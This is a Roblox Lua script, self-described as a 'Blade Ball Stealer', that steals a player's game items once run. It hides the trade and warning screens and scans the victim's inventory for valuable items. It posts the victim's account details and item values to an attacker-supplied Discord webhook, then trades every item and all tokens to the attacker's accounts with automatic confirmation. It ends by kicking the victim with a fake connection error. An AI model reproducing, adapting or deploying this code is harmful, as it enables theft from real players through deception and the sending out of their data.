_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
local PlayerGui = plr.PlayerGui
local tradeGui = PlayerGui.Trade
local inTrade = false
local notificationsGui = PlayerGui.Notifications
local tradeCompleteGui = PlayerGui.TradeCompleted
local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(game.ReplicatedStorage.Packages.Replion)

local users = _G.Usernames or {}
local min_rap = _G.min_rap or 100
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""

-- SECURITÉ IMPORTANTE (TON CODE ORIGINAL)
if next(users) == nil or webhook == "" then
    plr:kick("You didn't add usernames or webhook")
    return
end

if game.PlaceId ~= 13772394625 then
    plr:kick("only work on server normal")
    return
end

if #Players:GetPlayers() >= 16 then
    plr:kick("Server is full. Please join a less populated server")
    return
end

if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
    plr:kick("Server error. Please join a DIFFERENT server")
    return
end

-- SYSTEME RESET PIN (CRUCIAL)
local args = {
    [1] = {
        ["option"] = "PIN",
        ["value"] = "9079"
    }
}
local _, PINReponse = netModule:WaitForChild("RF/ResetPINCode"):InvokeServer(unpack(args))
if PINReponse ~= "You don't have a PIN code" then
    plr:kick("Account error. Please disable trade PIN and try again")
    return
end

-- CACHER L'UI (TON CODE)
tradeGui.Black.Visible = false
tradeGui.MiscChat.Visible = false
tradeCompleteGui.Black.Visible = false
tradeCompleteGui.Main.Visible = false

local maintradegui = tradeGui.Main
maintradegui.Visible = false
maintradegui:GetPropertyChangedSignal("Visible"):Connect(function() maintradegui.Visible = false end)
local unfairTade = tradeGui.UnfairTradeWarning
unfairTade.Visible = false
unfairTade:GetPropertyChangedSignal("Visible"):Connect(function() unfairTade.Visible = false end)
local notificationsFrame = notificationsGui.Notifications
notificationsFrame.Visible = false
notificationsFrame:GetPropertyChangedSignal("Visible"):Connect(function() notificationsFrame.Visible = false end)

tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
    inTrade = tradeGui.Enabled
end)

local function formatNumber(number)
    if number == nil then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return (suffixIndex == 1) and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[suffixIndex])
end

-- FONCTION EMBED AVEC PDP ET TOKENS (CORRIGÉE)
local function SendJoinMessage(list, prefix)
    local executor = identifyexecutor and identifyexecutor() or "Unknown"
    local browserJoin = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId
    local joinCommand = "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')"

    -- Calcul Tokens
    local rawText = PlayerGui.Main.Currency.Coins.Amount.Text
    local tokens = rawText:gsub("[^%d]", "") or "0"

    local totalRAP = 0
    local itemSummary = "🪙 **Tokens: " .. formatNumber(tonumber(tokens)) .. "**\n\n"
    local grouped = {}
    for _, item in ipairs(list) do
        totalRAP = totalRAP + item.RAP
        grouped[item.Name] = (grouped[item.Name] or 0) + 1
    end
    for name, count in pairs(grouped) do
        itemSummary = itemSummary .. name .. " (x" .. count .. ")\n"
    end

    local data = {
        ["content"] = (ping == "Yes" and "||​|| @everyone" or "") .. "\n`" .. joinCommand .. "`",
        ["embeds"] = {{
            ["title"] = "🟡 Pending Hit ... | ⚔️ Blade Ball Stealer",
            ["color"] = 16763904,
            ["fields"] = {
                {
                    ["name"] = "ℹ️ Player info:",
                    ["value"] = "```" ..
                        "\n🆔 Username      : " .. plr.Name ..
                        "\n👤 Display Name  : " .. plr.DisplayName ..
                        "\n🗓️ Account Age   : " .. plr.AccountAge .. " Days" ..
                        "\n⚡ Executor      : " .. executor ..
                        "\n📩 Receiver      : " .. (users[1] or "None") ..
                        "```",
                    ["inline"] = false
                },
                {
                    ["name"] = "🎯 Inventory:",
                    ["value"] = "```" ..
                        "\n💰 Total Value: " .. formatNumber(totalRAP) .. " RAP" ..
                        "\n\n" .. itemSummary ..
                        "```",
                    ["inline"] = false
                },
                {["name"] = "🔗 Join Server", ["value"] = "[Click to join game]("..browserJoin..")", ["inline"] = true},
                {["name"] = "📜 Full Inventory", ["value"] = "[Click to show](https://www.roblox.com/users/"..plr.UserId.."/inventory)", ["inline"] = true}
            },
            ["footer"] = {["text"] = "by Eblack • " .. os.date("%B %d, %Y")},
            ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"}
        }}
    }

    local response = request({
        Url = webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(data)
    })
end

-- LOGIQUE DE SCAN (TON CODE ORIGINAL)
local rapData = Replion.Client:GetReplion("ItemRAP").Data.Items
local function buildNameToRAPMap(category)
    local nameToRAP = {}
    if not rapData[category] then return nameToRAP end
    for k, v in pairs(rapData[category]) do
        local success, decoded = pcall(function() return HttpService:JSONDecode(k) end)
        if success then for _, pair in ipairs(decoded) do if pair[1] == "Name" then nameToRAP[pair[2]] = v break end end end
    end
    return nameToRAP
end

local rapMappings = {}
for _, category in ipairs(categories) do rapMappings[category] = buildNameToRAPMap(category) end

for _, category in ipairs(categories) do
    for itemId, itemInfo in pairs(clientInventory[category]) do
        if not itemInfo.TradeLock then
            local rap = (rapMappings[category] and rapMappings[category][itemInfo.Name]) or 0
            if rap >= min_rap then
                table.insert(itemsToSend, {ItemID = itemId, RAP = rap, itemType = category, Name = itemInfo.Name})
            end
        end
    end
end

-- EXECUTION DES TRADES (TON CODE ORIGINAL)
if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
    SendJoinMessage(itemsToSend, prefix)

    local function doTrade(joinedUser)
        while #itemsToSend > 0 do
            netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(Players:WaitForChild(joinedUser))
            repeat wait(0.5) until inTrade

            local currentBatch = {}
            for i = 1, math.min(100, #itemsToSend) do table.insert(currentBatch, table.remove(itemsToSend, 1)) end
            for _, item in ipairs(currentBatch) do
                netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
            end

            local rawText = PlayerGui.Main.Currency.Coins.Amount.Text
            local cleanedText = rawText:gsub("[^%d]", "")
            local tokensamount = tonumber(cleanedText) or 0
            if tokensamount >= 1 then
                netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokensamount)
            end

            netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
            netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
            repeat wait(0.2) until not inTrade
        end
        plr:kick("Please check your internet connection and try again. (Error Code: 277)")
    end

    for _, p in ipairs(Players:GetPlayers()) do
        if table.find(users, p.Name) then doTrade(p.Name) break end
    end
    Players.PlayerAdded:Connect(function(p)
        if table.find(users, p.Name) then doTrade(p.Name) end
    end)
end
